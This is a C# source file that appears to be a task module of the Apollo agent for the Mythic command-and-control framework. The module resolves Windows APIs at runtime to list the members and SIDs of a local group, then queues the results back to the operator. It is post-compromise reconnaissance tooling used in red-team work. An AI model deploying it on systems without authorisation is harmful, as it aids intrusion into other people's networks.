#define COMMAND_NAME_UPPER

#if DEBUG
#define NET_LOCALGROUP_MEMBER
#endif

#if NET_LOCALGROUP_MEMBER

using ApolloInterop.Classes;
using ApolloInterop.Classes.Api;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Text;
using ST = System.Threading.Tasks;

namespace Tasks
{
    public class net_localgroup_member : Tasking
    {
        [DataContract]
        internal struct NetLocalGroupMemberParameters
        {
            [DataMember(Name = "computer")]
            public string Computer;
            [DataMember(Name = "group")]
            public string Group;
        }

        [DataContract]
        internal struct NetLocalGroupMember
        {
            [DataMember(Name = "computer_name")]
            public string ComputerName;
            [DataMember(Name = "group_name")]
            public string GroupName;
            [DataMember(Name = "member_name")]
            public string MemberName;
            [DataMember(Name = "sid")]
            public string SID;
            [DataMember(Name = "is_group")]
            public bool IsGroup;
        }

        #region typedefs

        private delegate int NetLocalGroupGetMembers(
            [MarshalAs(UnmanagedType.LPWStr)] string servername,
            [MarshalAs(UnmanagedType.LPWStr)] string localgroupname,
            int level,
            out IntPtr bufptr,
            int prefmaxlen,
            out int entriesread,
            out int totalentries,
            ref IntPtr resume_handle);

        private delegate bool ConvertSidToStringSid(IntPtr pSid, out string strSid);
        private delegate int NetApiBufferFree(IntPtr lpBuffer);
        /*
         [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool ConvertSidToStringSid(IntPtr pSid, out string strSid);
         */
        private NetLocalGroupGetMembers _pNetLocalGroupGetMembers;
        private ConvertSidToStringSid _pConvertSidToStringSid;
        private NetApiBufferFree _pNetApiBufferFree;

        public enum SidNameUse
        {
            SidTypeUser = 1,
            SidTypeGroup,
            SidTypeDomain,
            SidTypeAlias,
            SidTypeWellKnownGroup,
            SidTypeDeletedAccount,
            SidTypeInvalid,
            SidTypeUnknown,
            SidTypeComputer,
            SidTypeLabel,
            SidTypeLogonSession
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LocalGroupMembersInfo
        {
            public IntPtr lgrmi2_sid;
            public SidNameUse lgrmi2_sidusage;
            public IntPtr lgrmi2_domainandname;
        }

        #endregion
        public net_localgroup_member(IAgent agent, ApolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
        {
            _pNetLocalGroupGetMembers = _agent.GetApi().GetLibraryFunction<NetLocalGroupGetMembers>(Library.SAMCLI, "NetLocalGroupGetMembers");
            _pConvertSidToStringSid = _agent.GetApi().GetLibraryFunction<ConvertSidToStringSid>(Library.ADVAPI32, "ConvertSidToStringSidA");
            _pNetApiBufferFree = _agent.GetApi().GetLibraryFunction<NetApiBufferFree>(Library.NETUTILS, "NetApiBufferFree");
        }
        public override void Start()
        {
            TaskResponse resp;
            NetLocalGroupMemberParameters args = _jsonSerializer.Deserialize<NetLocalGroupMemberParameters>(_data.Parameters);
            if (string.IsNullOrEmpty(args.Computer))
            {
                args.Computer = Environment.GetEnvironmentVariable("COMPUTERNAME");
            }

            List<NetLocalGroupMember> results = new List<NetLocalGroupMember>();
            int entriesRead;
            int totalEntries;
            IntPtr resumePtr = IntPtr.Zero;
            
            int val = _pNetLocalGroupGetMembers(args.Computer, args.Group, 2, out IntPtr bufPtr, -1, out entriesRead,
                out totalEntries, ref resumePtr);
            if (entriesRead > 0)
            {
                LocalGroupMembersInfo[] groupMembers = new LocalGroupMembersInfo[entriesRead];
                IntPtr iter = bufPtr;
                for (int i = 0; i < entriesRead; i++)
                {
                    groupMembers[i] = (LocalGroupMembersInfo) Marshal.PtrToStructure(iter, typeof(LocalGroupMembersInfo));
                    iter = (IntPtr) ((int) iter + Marshal.SizeOf(typeof(LocalGroupMembersInfo)));
                    //myList.Add(Marshal.PtrToStringUni(Members[i].lgrmi2_domainandname) + "," + Members[i].lgrmi2_sidusage);
                    string sidString = "";
                    bool bRet = _pConvertSidToStringSid(groupMembers[i].lgrmi2_sid, out sidString);
                    if (!bRet)
                        continue;
                    var result = new NetLocalGroupMember();
                    result.ComputerName = args.Computer;
                    result.GroupName = args.Group;
                    result.IsGroup = (groupMembers[i].lgrmi2_sidusage == SidNameUse.SidTypeGroup);
                    result.SID = sidString;
                    result.MemberName = Marshal.PtrToStringUni(groupMembers[i].lgrmi2_domainandname);
                    results.Add(result);
                }

                if (bufPtr != IntPtr.Zero)
                {
                    _pNetApiBufferFree(bufPtr);
                }
            }

            resp = CreateTaskResponse(
                _jsonSerializer.Serialize(results.ToArray()), true);
            // Your code here..
            // Then add response to queue
            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
    }
}

#endif